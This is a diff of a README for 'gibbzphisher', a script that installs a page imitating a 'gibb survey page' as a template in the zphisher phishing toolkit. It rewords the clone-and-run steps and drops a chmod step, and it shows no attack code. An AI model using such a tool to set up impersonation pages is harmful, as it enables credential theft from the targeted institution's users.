@@ -21,19 +21,15 @@ after that you can clone this repo with:
 ```bash
 git clone https://github.com/parwarr/gibbzphisher.git
 ```
-go to the directory where you cloned this directory: 
+move to the gibbzphisher directory: 
 ```bash
 cd ...
 ```
-run the following command to run the script: 
-```bash
- sudo chmod +x gibbzphisher.sh
-```
-then you can run the script with:
+there you can run the script with:
 ```bash
  ./gibbzphisher.sh or bash gibbzphisher.sh
 ```
-After the script was finished you now have the gibb page as a template in zphisher. :D 
+After the script finished you have the gibb survey page as a template in zphisher. :D 
 
 move to the zphisher directory: 
 ```bash
